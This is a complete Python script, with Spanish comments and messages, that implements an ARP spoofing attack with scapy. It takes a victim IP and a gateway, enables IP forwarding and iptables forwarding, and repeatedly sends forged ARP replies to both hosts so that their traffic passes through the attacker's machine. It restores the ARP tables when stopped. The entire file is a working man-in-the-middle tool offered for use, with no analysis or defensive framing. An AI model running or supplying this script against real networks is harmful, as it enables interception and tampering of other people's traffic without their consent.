#!/usr/bin/env python3
# Autor = Pepe >:) 

import scapy.all as scapy
import subprocess
import argparse
import time
import sys
import os

from termcolor import colored
from scapy.all import conf


def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer Avanzado")
    parser.add_argument("-t", "--target", required=True, dest="target_ip", help="Direccion IP de la víctima")
    parser.add_argument("-g", "--gateway", required=False, dest="gateway_ip", default="192.168.1.1", help="IP del Router")
    parser.add_argument("-i", "--interface", required=True, dest="interface", help="Interfaz de red (ej: enp4s0, wlan0)")
    parser.add_argument("-m", "--mac", required=False, dest="custom_mac", help="MAC falsa opcional")
    parser.add_argument("-d", "--delay", dest="delay", type=float, default=2.0, help="Intervalo en segundos (Default: 2.0)")

    args = parser.parse_args()
    return args.target_ip, args.gateway_ip, args.interface, args.custom_mac, args.delay

def toggle_forwarding_rules(enable=True):
    val = "1" if enable else "0"
    action = "-I" if enable else "-D" 
    
    subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={val}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    redir_val = "0" if enable else "1"
    subprocess.run(["sysctl", "-w", f"net.ipv4.conf.all.send_redirects={redir_val}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    cmd_iptables = ["iptables", action, "FORWARD", "-j", "ACCEPT"]
    subprocess.run(cmd_iptables, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def manage_static_arp(ip, mac, interface, add=True):
    if add:
        cmd = ["ip", "neigh", "replace", ip, "lladdr", mac, "dev", interface, "nud", "permanent"]
    else:
        cmd = ["ip", "neigh", "del", ip, "dev", interface]
    
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_mac(ip, interface):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    try:
        answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False, retry=2, iface=interface)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
    except Exception as e:
        print(colored(f"[-] Error obteniendo MAC: {e}", "red"))
    
    return None

def spoof(target_ip, target_mac, spoof_ip, interface, custom_mac=None):

    ether_frame = scapy.Ether(dst=target_mac)

    if custom_mac:
        arp_layer = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=custom_mac)
    else:
        arp_layer = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    packet = ether_frame / arp_layer

    scapy.sendp(packet, verbose=False, iface=interface)

def restore(destination_ip, destination_mac, source_ip, source_mac, interface):
    if destination_mac and source_mac:
        ether_frame = scapy.Ether(dst=destination_mac)
        arp_layer = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        packet = ether_frame / arp_layer
        scapy.sendp(packet, count=4, verbose=False, iface=interface)

def main():
    if os.geteuid() != 0:
        sys.exit(colored("\n[!] Necesitas ejecutar esto como ROOT (sudo)", "red"))

    target_ip, gateway_ip, interface, custom_mac, delay = get_arguments()

    conf.iface = interface
    conf.verb = 0

    print(colored(f"\n--- ARP SPOOFER en Interfaz: {interface} ---", "white", attrs=['bold']))
    
    print(colored(f"  [*] Configurando entorno de red...", "blue"))
    toggle_forwarding_rules(True)

    print(colored(f"  [*] Obteniendo MACs reales...", "blue"))
    target_mac = get_mac(target_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)

    if not target_mac:
        print(colored(f"\n[-] No se encontró la MAC de la víctima ({target_ip}).", "red"))
        toggle_forwarding_rules(False)
        sys.exit(1)
    
    if not gateway_mac:
        print(colored(f"\n[-] No se encontró la MAC del Router ({gateway_ip}).", "red"))
        toggle_forwarding_rules(False)
        sys.exit(1)

    print(colored(f"  [+] Objetivo: {target_ip} [{target_mac}]", "green"))
    print(colored(f"  [+] Gateway:  {gateway_ip} [{gateway_mac}]", "green"))
    
    print(colored(f"  [*] Fijando tablas ARP locales para evitar bucles...", "blue"))
    manage_static_arp(target_ip, target_mac, interface, add=True)
    manage_static_arp(gateway_ip, gateway_mac, interface, add=True)
    # ---------------------------

    print(colored("-" * 40, "white"))
    print(colored(f"\n[+] Captacion en curso (Ctrl+C para parar)\n",'grey'))

    packet_counter = 0

    try:
        while True:
            spoof(target_ip, target_mac, gateway_ip, interface, custom_mac)
            spoof(gateway_ip, gateway_mac, target_ip, interface, custom_mac)
            
            packet_counter += 2
            print(colored(f"\r[+] Paquetes enviados: {packet_counter}", 'green'), end="")
            sys.stdout.flush()
            
            time.sleep(delay)

    except KeyboardInterrupt:
        print(colored("\n\n[!] Deteniendo ataque...\n", "yellow"))
        print(colored("[*] Restaurando red", "blue"))
        restore(target_ip, target_mac, gateway_ip, gateway_mac, interface)
        restore(gateway_ip, gateway_mac, target_ip, target_mac, interface)
        
    finally:
        manage_static_arp(target_ip, target_mac, interface, add=False)
        manage_static_arp(gateway_ip, gateway_mac, interface, add=False)
        toggle_forwarding_rules(False)
        print(colored(f"\n[+] Finalizado. Total paquetes: {packet_counter}", "green"))
        print(colored("[+] Reglas limpiadas. Red restaurada.", "green"))

if __name__ == "__main__":
    main()